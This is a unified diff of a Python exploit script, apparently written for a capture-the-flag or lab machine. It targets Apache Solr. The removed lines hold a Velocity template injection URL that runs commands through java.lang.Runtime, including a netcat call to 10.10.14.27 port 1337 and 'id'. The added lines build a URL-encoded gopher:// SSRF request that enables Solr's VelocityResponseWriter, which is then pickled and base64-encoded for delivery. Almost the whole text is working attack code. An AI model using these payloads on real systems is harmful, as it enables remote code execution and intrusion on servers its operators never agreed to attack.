@@ -24,34 +24,30 @@ import json
 import pickle
 
 def make_data(port):
-    url = ("/solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom="
-            "%23set($x=%27%27)+"
-            "%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+"
-            "%23set($chr=$x.class.forName(%27java.lang.Character%27))+"
-            "%23set($str=$x.class.forName(%27java.lang.String%27))+"
-            "%23set($ex=$rt.getRuntime().exec(%27" + "nc%2010.10.14.27%201337" +
-            "%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+"
-            "%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end")
-    inj = 'String[] commands = new String[]{"nc", "localhost", "8080"};Process childProc = Runtime.getRuntime().exec(command);InputStream in = childProc.getInputStream();int c;while ((c = in.read()) != -1) {System.out.print((char)c);}in.close();'
+    # use gopher to emulate this post request
+    '''
+    _POST /solr/staging HTTP/1.1
+    Host: 127.0.0.1
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
+    Accept: */*
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Content-Type: application/x-www-form-urlencoded
+    Cache: no-cache
+    Connection: close
 
-    url = "/solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
+    {"update-queryresponsewriter": {"startup": "lazy", "name": "velocity", "class": "solr.VelocityResponseWriter", "template.base.dir": "", "solr.resource.loader.enabled": "true", "params.resource.loader.enabled": "true"}}
 
-    p = '{"version": "v1.0","title": "Printer Feed","home_page_url": "http://localhost:' + port + url + '","feed_url": "http://localhost:' + port +'/feeds.json"}'
+
+    '''
+
+    payload = "_POST%20%2Fsolr%2Ffeed_engine%20HTTP%2F1.1%0AHost%3A%20127.0.0.1%0AUser-Agent%3A%20Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64%3B%20rv%3A69.0)%20Gecko%2F20100101%20Firefox%2F69.0%0AAccept%3A%20*%2F*%0AAccept-Language%3A%20zh-CN%2Czh%3Bq%3D0.8%2Czh-TW%3Bq%3D0.7%2Czh-HK%3Bq%3D0.5%2Cen-US%3Bq%3D0.3%2Cen%3Bq%3D0.2%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0ACache%3A%20no-cache%0AConnection%3A%20close%0A%0A%7B%22update-queryresponsewriter%22%3A%20%7B%22startup%22%3A%20%22lazy%22%2C%20%22name%22%3A%20%22velocity%22%2C%20%22class%22%3A%20%22solr.VelocityResponseWriter%22%2C%20%22template.base.dir%22%3A%20%22%22%2C%20%22solr.resource.loader.enabled%22%3A%20%22true%22%2C%20%22params.resource.loader.enabled%22%3A%20%22true%22%7D%7D%0A%0A"
+
+    p = '{"version": "v1.0","title": "Printer Feed","home_page_url": "http://localhost:' + port + '","feed_url": "gopher://localhost:8983/' +payload+ '"}'
+
     # For storing 
     p = pickle.dumps(p)     # type(b) gives <class 'bytes'> 
     p = base64.b64encode(p)
     return p 
-
-'''
-p = pickle.loads(b) 
-print(p) 
-assert(0)
-
-#serialize
-payload = json.dumps(p).encode()
-payload = base64.b64encode(payload)
-'''
-
 
 def run(t):
     # NOTE(gRPC Python Team): .close() is possible on a channel and should be
